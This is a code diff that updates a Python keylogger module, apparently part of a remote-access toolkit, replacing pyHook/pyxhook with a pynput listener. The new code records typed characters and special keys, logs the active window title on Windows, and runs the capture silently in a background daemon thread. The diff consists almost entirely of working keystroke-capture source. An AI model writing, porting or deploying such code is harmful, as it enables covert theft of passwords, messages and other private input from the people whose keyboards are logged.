@@ -14,11 +14,7 @@ except ImportError:
     from io import StringIO        # Python 3
 
 # packages
-if sys.platform == 'win32':
-    import pyHook as hook_manager
-    import pythoncom
-else:
-    import pyxhook as hook_manager
+from pynput import keyboard
 
 # utilities
 import util
@@ -26,7 +22,7 @@ import util
 # globals
 abort = False
 command = True
-packages = ['util','pyHook','pythoncom'] if os.name == 'nt' else ['util','pyxhook']
+packages = ['util','pynput']
 platforms = ['win32','linux2','darwin']
 window = None
 max_size = 4000
@@ -41,60 +37,71 @@ or an FTP server
 """
 
 # main
-def _event(event):
+def _on_press(key):
     global logs
     global window
     try:
-        if event.WindowName != window:
-            window = event.WindowName
-            logs.write("\n[{}]\n".format(window))
-        if event.Ascii > 32 and event.Ascii < 127:
-            logs.write(chr(event.Ascii))
-        elif event.Ascii == 32:
+        # Try to get the window title (platform specific)
+        try:
+            if sys.platform == 'win32':
+                import win32gui
+                window_title = win32gui.GetWindowText(win32gui.GetForegroundWindow())
+                if window_title != window:
+                    window = window_title
+                    logs.write("\n[{}]\n".format(window))
+            elif sys.platform == 'darwin':
+                # macOS requires additional libraries for window title
+                pass
+            elif sys.platform.startswith('linux'):
+                # Linux requires additional libraries for window title
+                pass
+        except:
+            pass
+            
+        # Handle the key press
+        if hasattr(key, 'char') and key.char:
+            if key.char >= ' ' and key.char <= '~':
+                logs.write(key.char)
+        elif key == keyboard.Key.space:
             logs.write(' ')
-        elif event.Ascii in (10,13):
+        elif key == keyboard.Key.enter:
             logs.write('\n')
-        elif event.Ascii == 8:
+        elif key == keyboard.Key.backspace:
             logs.seek(-1, 1)
             logs.truncate()
-        else:
-            pass
+        elif key == keyboard.Key.tab:
+            logs.write('\t')
+        elif key == keyboard.Key.esc:
+            logs.write('[ESC]')
+        
     except Exception as e:
-        print('{} error: {}'.format(event.__name__, str(e)))
+        util.log(f"Keylogger error: {str(e)}")
     return True
 
-def _run_windows():
+def _on_release(key):
     global abort
-    while True:
-        hm = hook_manager.HookManager()
-        hm.KeyDown = _event
-        hm.HookKeyboard()
-        pythoncom.PumpMessages()
-        if abort:
-            break
+    if abort:
+        # Stop listener
+        return False
+    return True
 
 def _run():
     global abort
-    while True:
-        hm = hook_manager.HookManager()
-        hm.KeyDown = _event
-        hm.HookKeyboard()
-        time.sleep(0.1)
-        if abort:
-            break   
+    with keyboard.Listener(
+            on_press=_on_press,
+            on_release=_on_release) as listener:
+        listener.join()
 
 def run():
     """
     Run the keylogger
-
     """
     global threads
     try:
         if 'keylogger' not in threads or not threads['keylogger'].is_alive():
-            if os.name == 'nt':
-                threads['keylogger'] = threading.Thread(target=_run_windows, name=time.time())
-            else:
-                threads['keylogger'] = threading.Thread(target=_run, name=time.time())
+            threads['keylogger'] = threading.Thread(target=_run, name=time.time())
+            threads['keylogger'].daemon = True
+            threads['keylogger'].start()
         return threads['keylogger']
     except Exception as e:
         util.log(str(e))
